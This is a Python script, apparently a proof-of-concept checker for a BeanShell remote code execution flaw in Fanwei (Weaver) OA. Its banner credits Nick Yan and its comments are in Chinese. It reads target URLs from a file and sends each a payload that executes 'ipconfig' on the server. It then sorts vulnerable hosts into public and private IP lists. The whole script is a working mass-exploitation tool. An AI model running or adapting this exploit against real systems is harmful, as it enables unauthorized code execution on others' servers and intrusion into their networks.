import requests
import urllib.request
import urllib.parse

pic = '''
 (                                        )           (                
 )\ )             (  (                 ( /(   (       )\ )   (         
(()/(    )        )\))(   '   (   (    )\())  )\     (()/(   )\   (    
 /(_))( /(   (   ((_)()\ )   ))\  )\  ((_)\((((_)(    /(_))(((_)  )\   
(_))_|)(_))  )\ )_(())\_)() /((_)((_)   ((_))\ _ )\  (_))  )\___ ((_)  
| |_ ((_)_  _(_/(\ \((_)/ /(_))   (_)  / _ \(_)_\(_) | _ \((/ __|| __| 
| __|/ _` || ' \))\ \/\/ / / -_)  | | | (_) |/ _ \   |   / | (__ | _|  
|_|  \__,_||_||_|  \_/\_/  \___|  |_|  \___//_/ \_\  |_|_\  \___||___| 
By Nick Yan
'''

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Connection':'close',
    'Content-Type': 'application/x-www-form-urlencoded', # post 请求需要添加这个头部
}

# Burp agent
proxies = {
    'http': "127.0.0.1:8080",
    'https': "127.0.0.1:8080",
}

requests.adapters.DEFAULT_RETRIES = 5
requests.packages.urllib3.disable_warnings()

Public_ips = []
Private_ips = []
Error_ips = []


def veri(url):
    '''
    已经获取到了可以访问 BeanShell 的页面，说明该页面可能存在 RCE，接下来 POC 验证
    '''

    url = url.strip()
    ip = urllib.parse.urlparse(url).netloc
    addr = ip.split(':')[0]
    #print(addr)


    try:
        Paload_data = 'bsh.script=exec%28%22ipconfig%22%29%3B%0D%0A&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'
        resp = requests.post(url=url, proxies=proxies, headers=headers, timeout=8, data=Paload_data, verify=False)

        
        if not resp:
            Error_ips.append(ip)
            print("[-] %s 无响应..." %str(ip))
            return
        if "Script Error" in str(resp.content):
            Error_ips.append(ip)
            print("[-] %s 无法 RCE..."%str(ip))
            return

        if resp.status_code == 200:
            if addr in str(resp.content):
                Public_ips.append(ip)
                print("\033[31;1m[+] %s is public IP. \033[0m"%str(ip))
                return
            else:
                Private_ips.append(ip)
                print("[+] %s is private IP. "%str(ip))
                return
        else:
            Error_ips.append(ip)
            print("[-] %s Something wrong with code execution... "%str(ip))
            return

    except Exception as e:
        print(e)
        return


if __name__ == "__main__":

    with open('vuln.txt', 'r') as f:
        print(f"{pic}\n")
        print("[+] 开始检索...")
        
        for url in f.readlines():
            veri(url)
        print("[+] verifing is finished...")

        f_1 = open("public_ip.txt",'a')
        f_2 = open("private_ip.txt",'a')
        f_3 = open("error_ip.txt",'a')

        for a in Public_ips:
            f_1.write(a+'\n')
        for b in Private_ips:
            f_2.write(b+'\n')
        for c in Error_ips:
            f_3.write(c+'\n')

        f_1.close()
        f_2.close()
        f_3.close()
        print("[+] IP 已写入当前目录下，请查看.")
